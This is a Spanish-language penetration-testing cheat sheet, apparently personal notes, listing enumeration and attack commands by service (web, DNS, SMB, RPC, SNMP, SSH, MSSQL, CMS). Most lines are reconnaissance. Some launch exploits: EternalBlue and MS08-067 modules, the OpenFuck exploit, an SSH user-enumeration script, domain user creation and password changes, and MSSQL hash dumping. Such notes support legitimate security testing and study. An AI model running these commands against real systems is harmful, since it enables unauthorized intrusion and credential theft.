gobuster -w WORDLIST -u URL [-k] (para saltar comprobación SSL)

wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt [IP]

dirb URL DICC
dirb URL -p IP:PUERTO // Usar un proxy

uniscan -u URL -qweds

theharvester (direcciones de correo electrónico dentro de una web)
	con opción "-d all" usa todos los motores de búsqueda
	theharvester -d WEB -b all > mail.txt

**SIMPLYEMAIL**
	git clone https://github.com/killswitch-GUI/SimplyEmail.git
	pip install fake_useragent
	pip install BeautifulSoup
	pip install docx2txt
	python SimplyEmail.py -all -e URL

whois (información general)

filetype:cfg
mysql dump filetype:sql

cutycapt --url=URL --out=captura.png [--insecure] // Hace una captura de pantalla de la web especificada

maltego (información general pudiendo especificar)

netcraft.com

network-tool.com

metagoofil -d [url] -t [tipo de documento] -l [límite] -n [intentos] -o [archivo de salida] -f [archivo html que genera el programa]

**Escaneo
	nc -nvv -w 1 -z IP PUERTOS

**BANNER GRABBING**
telnet [dirección] [puerto] (para banner grabbing 80)
O "nc -vv [ip] [puerto]"
	Si está abierto, podemos hacer "OPTIONS / HTTP/1.0" (banner grabbing) con doble enter después, y con suerte se pueden ver los métodos permitidos en la web, o HEAD

#WEB

/?-s // Para mostrar el código fuente en php

**Para testear TRACE**
telnet URL 80
TRACE / HTTP/1.1
Host: foo.bar
X-Header: test

O también
curl -i -X TRACE URL

**Para testear OPTIONS**
telnet URL 80
OPTIONS / HTTP/1.1
Host: foo.bar

#DNS
nslookup
	set type=mx (para obtener servidores de correo corporativos)
**DNS Zone Transfers**
    host -t ns [url] // Para obtener el nameserver
    host -l [url] [nameserver] // Para intentar hacer el zone transfer y que muestre toda la lista de resoluciones DNS
    ***************************************************************************************************************
    // script.sh URL
    for server in $(host -t ns $1 | cut -d " " -f 4); do
    host -l $1 $server | grep "has address"
    done
    ***************************************************************************************************************
	dig a/mx/axfr domain-name-here.com @nameserver
    dnsrecon -d URL -t axfr
    dnsenum URL

#SMB
Enumerar info SMB
	use auxiliary/scanner/smb/smb_version
	enum4linux -a IP
	nbtscan -r RED
	smbclient -L //IP // Ya lo hace enum4linux. Lista recursos compartidos en la máquina con null session
	smbclient -U [username] -L [IP target] // Ya lo hace enum4linux
	smb-enum-shares.nse -p445
	nbstat.nse -p 137 // Netbios expuestos
	smb-os-discovery.nse
	smb-enum-users.nse -p U:137,T:139
  	smb-check-vulns --script-args=unsafe=1 -p 445
  	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
  	put [archivo] (sube el archivo al directorio del ordenador víctima)
  use auxiliary/scanner/smb/smb_ms17_010
	Si es vulnerable
		use exploit/windows/smb/ms17_010_eternalblue
  Para WinXP =>
    smb-vuln-ms08-067.nse
    use auxiliary/scanner/smb/ms08_067_check
    use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
    payload windows/vncinject/bind_tcp

#POP3
telnet IP 110
USER usuario
PASS password
list
retr NUMERO

#RPC
rpcinfo -p IP [apt-get install nfs-common]
rpcclient -U ""/"USERNAME" --command=enumprivs -N IP // Enumerar privilegios
rpcclient -U "" (Y después ir probando entre las comillas posibles usernames) IP
	Probamos con contraseñas vacías
	Si entramos, con srvinfo obtenemos info sobre el sistema
	Con querydominfo obtenemos más info
	Con enumdomusers enumeramos los usuarios del sistema
	Con createdomuser [nombre] si tenemos privilegios creamos un usuario
	Con getdompwinfo vemos la complejidad mínima para las contraseñas
	Con chgpasswd2 [username] [old pass] [new pass] cambiamos la contraseña
	Con lsaquery (en teoría) obtenemos el nombre de dominio

#NFS
nmap -sV --script=nfs-showmount IP

#SMTP
nc -v [ip] 25
    VRFY [usuario] Para comprobar si ese usuario existe y su email
    HELO asdf // Devuelve el nombre de dominio
smtp-commands.nse

#SNMP
	DEFAULT PASS
	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
	
	snmpwalk -c public IP 1.3.6.1.4.1.77.1.2.25 // Windows Users
	snmpwalk -c public IP 1.3.6.1.2.1.25.4.2.1.2 // Windows Processes
	snmpwalk -c public IP 1.3.6.1.2.1.6.13.1.3 // Open TCP Ports
	snmpwalk -c public IP 1.3.6.1.2.1.25.6.3.1.2 // Installed Software
  	snmpwalk -v 1(o la que sea) -c public(community name de snmp_login) IP

	snmpcheck -t IP -c public // Enumeración
	snmpenum -t IP
	onesixtyone -c NAMES -i HOSTS
	
	auxiliary/scanner/snmp/snmp_login
	auxiliary/scanner/snmp/snmp_enum

#FTP
  use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
  definir RHOSTS (targets)
  
#OPENSSL
OpenFuck => https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
	gcc -o OpenFuck /usr/share/exploitdb/exploits/unix/remote/764.c -lcrypto

#SSH
	use auxiliary/scanner/ssh/ssh_enumusers
	python /usr/share/exploitdb/exploits/linux/remote/45233.py --userList /usr/share/wordlists/metasploit/unix_users.txt --outputFile salida.txt 192.168.137.128
	cat salida.txt | grep "is a valid" | cut -d " " -f 1 | sort -u > parsedUsers.txt
	https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
	https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt

#MYSQL
	use auxiliary/admin/mysql/mysql_enum


#CMS
wpscan 	NO ADMITE SITIOS .WORDPRESS.COM
	--url [url] --enumerate p (plugins)
	en vez de p, vp para plugins vulnerables
	vt para temas vulnerables
	u enumera usernames

Escáner CMS
	https://github.com/FlorianHeigl/cms-explorer
	https://github.com/Tuhinshubhra/CMSeeK
	
	
#MSSQL
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER IP

#VNC
use auxiliary/scanner/vnc/vnc_none_auth
